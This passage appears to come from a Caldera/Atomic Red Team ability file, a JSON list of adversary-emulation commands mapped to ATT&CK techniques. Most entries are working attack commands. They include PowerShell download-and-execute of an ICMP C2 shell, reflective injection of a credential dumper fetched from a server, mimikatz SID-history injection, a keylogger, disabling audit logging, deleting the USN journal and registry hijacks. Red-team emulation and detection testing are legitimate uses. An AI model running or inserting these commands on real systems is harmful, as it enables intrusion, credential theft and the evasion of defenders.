echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "6004a80b66c4c3e30595f178d91e2051", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Hex decoding with shell utilities", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Window", "ability_id": "f1222384fe40cc71e7dea9d182014eaf", "technique_id": "T1564.003", "tactic": "defense-evasion", "requirements": [], "name": "Hidden Window", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Requires Apple Dev Tools\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "setfile -a V /tmp/evil", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "515c4806970b4836b9a3c251515a6147", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Hidden files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "6ac8f48413127289ac42b76a0785b08f", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Hide Files Through Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "e9129335265410ac1034c4f064853880", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Hide Windows Clock Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Hide a directory on MacOS\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /var/tmp/T1564.001_mac.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "touch /var/tmp/T1564.001_mac.txt; chflags hidden /var/tmp/T1564.001_mac.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "28b6c4b9b4441ece378a8cfd09bb451f", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Hide a Directory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Hooks functions in PowerShell to read TLS Communications\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mavinject $pid /INJECTRUNNING; Invoke-WebRequest", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Credential API Hooking", "ability_id": "00b2b957c27c8ecb65d72d9c515a3e4c", "technique_id": "T1056.004", "tactic": "multiple", "requirements": [], "name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system hostname for Linux and macOS systems.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "hostname", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "hostname", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "4a37cc5d05b6ce7a7287247ecf1aa404", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Hostname Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "hostname", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "e7d023dfcc77f4b701b6cdce79e9c3c2", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Hostname Discovery (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Non-Application Layer Protocol", "ability_id": "9ed218029d8392d2b4fdedd0f44bb052", "technique_id": "T1095", "tactic": "command-and-control", "requirements": [], "name": "ICMP C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Leverage Global Flags Settings\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Image File Execution Options Injection", "ability_id": "084a99acba0e75a6a5c99b8fd0bb3a92", "technique_id": "T1546.012", "tactic": "multiple", "requirements": [], "name": "IFEO Add Debugger", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Leverage Global Flags Settings\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Image File Execution Options Injection", "ability_id": "9ae998b0c1d7aa13b5393f962794b50f", "technique_id": "T1546.012", "tactic": "multiple", "requirements": [], "name": "IFEO Global Flags", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; Remove-Item -Path $fileName -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; $url = \"https://google.com\"; $file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"; $contentType = \"application/octet-stream\"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Automated Exfiltration", "ability_id": "305c23215a4bf6184ed701b5ca1d1af7", "technique_id": "T1020", "tactic": "exfiltration", "requirements": [], "name": "IcedID Botnet HTTP PUT", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify Firewalls", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Identify Firewalls", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find user running agent", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}, {"custom_parser_vals": {}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}, {"custom_parser_vals": {}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}, {"custom_parser_vals": {}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$env:username", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}, {"custom_parser_vals": {}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo %username%", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "Identify active user", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify all local users", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dscl . list /Users | grep -v '_'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-WmiObject -Class Win32_UserAccount", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Identify local users", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["auditpol /set /category:\"Account Logon\" /success:enable /failure:enable && auditpol /set /category:\"Detailed Tracking\" /success:enable && auditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable && auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable && auditpol /set /category:\"Detailed Tracking\" /success:disable", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "2a450a37a8601a2131ad0ecdb8188b54", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Impair Windows Audit Log Policy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run an application as a different user", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "3796a00b-b11d-4731-b4ca-275a07d83299", "technique_id": "T1059.001", "tactic": "execution", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "host.user.name", "edge": "has_password", "target": "host.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}], "name": "Impersonate user", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$xml = [System.IO.File]::ReadAllText(\"54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "0466a75bd82ff4bb4ff79cee53ac4312", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Import XML Schedule Task with Hidden Attribute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["fsutil usn createjournal m=1000 a=100 c:"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "fsutil usn deletejournal /D C:", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host", "ability_id": "9d2e91b9241ae43b517be2be98bddfd9", "technique_id": "T1070", "tactic": "defense-evasion", "requirements": [], "name": "Indicator Removal using FSUtil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "conhost.exe \"notepad.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indirect Command Execution", "ability_id": "fa212cd328e284d55b0c4d439b29caa3", "technique_id": "T1202", "tactic": "defense-evasion", "requirements": [], "name": "Indirect Command Execution - conhost.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indirect Command Execution", "ability_id": "a1aca621b607efe3540988a30307fb13", "technique_id": "T1202", "tactic": "defense-evasion", "requirements": [], "name": "Indirect Command Execution - forfiles.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pcalua.exe -a #{process} && pcalua.exe -a #{payload_path}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indirect Command Execution", "ability_id": "94ee9c0fda97e9e5131d6661348650d0", "technique_id": "T1202", "tactic": "defense-evasion", "requirements": [], "name": "Indirect Command Execution - pcalua.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["67d07e_Infdefaultinstall.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "InfDefaultInstall.exe 67d07e_Infdefaultinstall.inf", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "e1ae0c45990c70e3d7651c2c355f7bf9", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "InfDefaultInstall.exe .inf Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Injects cred dumper exe into an available process", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Portable Executable Injection", "ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7", "technique_id": "T1055.002", "tactic": "credential-access", "requirements": [], "name": "Inject Cred dumper into process (Spookier)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Injects sandcat DLL into an available process", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Portable Executable Injection", "ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "technique_id": "T1055.002", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "host.process.id"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Inject Sandcat into process", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$env:TEMP\\mimikatz\\x64\\mimikatz.exe \"sid::clear /sam:$env:username\" \"exit\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$env:TEMP\\mimikatz\\x64\\mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username\" \"exit\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: SID-History Injection", "ability_id": "33548b5551dd6fe979b00d2ad37e499b", "technique_id": "T1134.005", "tactic": "multiple", "requirements": [], "name": "Injection SID-History with mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\key.log -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1) { ; } else {Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1};  ;  $PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "a852c0f47cea36898e87cbd8fa53f943", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "Input Capture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["e764f6_T1546.010.reg", "9e2f65_T1546.010-cleanup.reg"], "parsers": [], "cleanup": ["reg.exe import 9e2f65_T1546.010-cleanup.reg >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe import e764f6_T1546.010.reg", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: AppInit DLLs", "ability_id": "37355813cce32de2f3f6e5c6208f7b4d", "technique_id": "T1546.010", "tactic": "multiple", "requirements": [], "name": "Install AppInit Shim", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load 